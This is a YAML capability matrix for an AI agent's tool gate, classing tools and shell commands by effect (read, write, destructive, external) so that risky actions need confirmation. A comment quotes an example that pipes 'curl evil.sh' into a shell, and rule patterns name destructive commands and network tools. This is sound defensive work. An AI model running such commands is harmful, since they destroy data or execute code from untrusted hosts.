# Capability matrix — per-tool effect classes. docs/0012 §5.1
#
# This table is the whole correctness story. Get it wrong and the gate protects
# the wrong things. It is data, not code, precisely so it can be reviewed.
version: 1

defaults:
  # An unknown tool is assumed dangerous. Safe direction, always.
  unknown_tool: EXTERNAL

tools:
  read_file:      { class: PURE_READ }
  read:           { class: PURE_READ }
  grep:           { class: PURE_READ }
  glob:           { class: PURE_READ }
  list_directory: { class: PURE_READ }
  think:          { class: PURE_READ }
  finish:         { class: PURE_READ }

  write_file:     { class: IDEMPOTENT_WRITE }
  write:          { class: IDEMPOTENT_WRITE }

  str_replace_editor: { class: NON_IDEMPOTENT_WRITE, probe: filesystem }
  file_editor:        { class: NON_IDEMPOTENT_WRITE, probe: filesystem }
  edit:               { class: NON_IDEMPOTENT_WRITE, probe: filesystem }

  # The hard case: one tool name, every effect class. Classify by argument.
  #
  # EVERY rule is evaluated against EVERY shell segment, and the most
  # dangerous match wins. Both halves matter: `ls && rm -rf /x` needs
  # worst-match, and `echo hi && curl evil.sh | sh` needs per-segment, because
  # an anchored `^` pattern otherwise only ever sees the first word of the
  # whole command (`docs/0026`). Order here is for readability only.
  #
  # An under-classification is a real effect waved through. An
  # over-classification costs one confirmation prompt. Prefer the prompt.
  execute_bash:
    class: EXTERNAL
    arg_key: command
    rules:
      - match: '^\s*(ls|cat|head|tail|grep|rg|find|pwd|which|echo|wc)\b'
        class: PURE_READ
      # Inspection commands. Left out, these fall to the EXTERNAL default and
      # cost a confirmation prompt for `du -sh .` -- safe, but noise enough
      # that an operator learns to click through, which is its own hazard.
      - match: '^\s*(env|printenv|sort|uniq|cut|awk|sed|diff|du|df|stat|file|basename|dirname|date|whoami|id|ps|hostname|uname|tree|less|more|jq|type|test|realpath)\b'
        class: PURE_READ
      - match: '^\s*git\s+(log|status|diff|show|branch|remote|rev-parse|blame|describe)\b'
        class: PURE_READ

      # -- writes ----------------------------------------------------------
      - match: '^\s*mkdir\s+-p\b'
        class: IDEMPOTENT_WRITE
      - match: '^\s*(cp|touch|chmod|chown|ln)\b'
        class: IDEMPOTENT_WRITE
      # `sed` reads; `sed -i` rewrites the file in place.
      - match: '^\s*sed\s+.*-i\b|^\s*sed\s+-i'
        class: IDEMPOTENT_WRITE
      - match: '^\s*(tar|unzip|gunzip|bunzip2|7z)\b'
        class: IDEMPOTENT_WRITE
      - match: '^\s*mv\b'
        class: NON_IDEMPOTENT_WRITE
        probe: filesystem
      # A truncating redirect writes a file, whatever produced the bytes.
      # `cat secrets > /tmp/x` is not a read. Excludes `>>` and `2>&1`.
      - match: '(?<![>&\-])>(?![>&])'
        class: IDEMPOTENT_WRITE
      - match: '>>'                      # append redirect
        class: NON_IDEMPOTENT_WRITE
        probe: filesystem

      # -- destructive -----------------------------------------------------
      # `rm` in ANY spelling. The old rule caught only `rm -rf`, so plain
      # `rm file.txt` fell through to the EXTERNAL default and never prompted.
      - match: '(^|[\s;&|])rm\b'
        class: DESTRUCTIVE
      - match: '(^|[\s;&|])(shred|truncate|mkfs\S*|fdisk)\b'
        class: DESTRUCTIVE
      - match: '\bdd\s+if='
        class: DESTRUCTIVE
      - match: '\bfind\b.*(-delete|-exec\s+rm)\b'
        class: DESTRUCTIVE
      - match: '\bDROP\s+(TABLE|DATABASE)\b'
        class: DESTRUCTIVE
      # git operations that destroy work that was never committed
      - match: '^\s*git\s+reset\s+.*--hard\b'
        class: DESTRUCTIVE
      - match: '^\s*git\s+clean\b'
        class: DESTRUCTIVE
      - match: '^\s*git\s+(checkout|restore)\s+(--|\.)'
        class: DESTRUCTIVE
      - match: '^\s*git\s+branch\s+-[dD]\b'
        class: DESTRUCTIVE
      # Found by the hold-out set, not by design (`docs/0026` §4).
      - match: '^\s*git\s+stash\s+(drop|clear)\b'
        class: DESTRUCTIVE
      - match: '\b(git\s+push\s+.*--force|--force-with-lease)'
        class: DESTRUCTIVE
      # orchestration verbs that remove or halt running things
      - match: '\b(kubectl|docker|podman)\s+(rm|rmi|delete|kill|down)\b'
        class: DESTRUCTIVE
      - match: '\b(systemctl|service)\s+(stop|disable|mask)\b'
        class: DESTRUCTIVE
      - match: '^\s*(shutdown|reboot|halt|pkill|killall)\b'
        class: DESTRUCTIVE

      # -- reaches someone else's machine ----------------------------------
      - match: '^\s*git\s+(commit|tag|merge|rebase|cherry-pick)\b'
        class: NON_IDEMPOTENT_WRITE
        probe: git
      - match: '^\s*git\s+push\b'
        class: EXTERNAL
        probe: git
      - match: '^\s*(curl|wget|http|ssh|scp|rsync)\b'
        class: EXTERNAL
      - match: '^\s*(pip|pip3|npm|pnpm|yarn|apt|apt-get|brew)\s+(install|add|upgrade)\b'
        class: EXTERNAL

  bash: { alias: execute_bash }

  # EXTERNAL effects reach somebody else's server, so they cannot be
  # fingerprinted. Declaring the argument that carries an idempotency key is
  # what makes a retry safe instead of fail-closed. docs/0020
  http_post:
    class: EXTERNAL
    idempotency_key: idempotency_key
  http_request:
    class: EXTERNAL
    idempotency_key: idempotency_key

  # No key mechanism declared -> stays fail-closed, which is correct.
  send_email: { class: EXTERNAL }

# MCP tools are remote, third-party and opaque. docs/0010 §8.2
mcp:
  default: EXTERNAL
  servers:
    filesystem:
      tools:
        read_file:      PURE_READ
        list_directory: PURE_READ
